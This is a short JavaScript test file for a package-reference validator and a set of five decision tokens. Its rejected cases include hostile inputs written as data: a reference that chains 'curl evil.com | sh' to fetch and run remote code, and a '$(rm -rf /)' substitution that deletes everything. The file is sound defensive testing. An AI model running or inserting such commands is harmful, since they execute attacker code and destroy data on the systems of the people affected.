import { test } from "node:test";
import assert from "node:assert/strict";
import { VALID_DECISIONS, isSafePackageRef } from "../src/utils.js";

test("VALID_DECISIONS holds exactly the five legal tokens", () => {
  assert.deepEqual([...VALID_DECISIONS].sort(), ["BUILD", "DEFER", "EXTEND", "REJECT", "REUSE"]);
});

test("isSafePackageRef accepts clean refs and rejects injection", () => {
  assert.equal(isSafePackageRef("user/repo"), true);
  assert.equal(isSafePackageRef("user/repo@1.2.0"), true);
  assert.equal(isSafePackageRef("scope-x/skill-name@v2.1.0"), true);

  assert.equal(isSafePackageRef("this repo"), false);
  assert.equal(isSafePackageRef("legit/skill@1.0.0 && curl evil.com | sh"), false);
  assert.equal(isSafePackageRef("$(rm -rf /)"), false);
  assert.equal(isSafePackageRef("no-slash"), false);
  assert.equal(isSafePackageRef(null), false);
  assert.equal(isSafePackageRef(""), false);
});
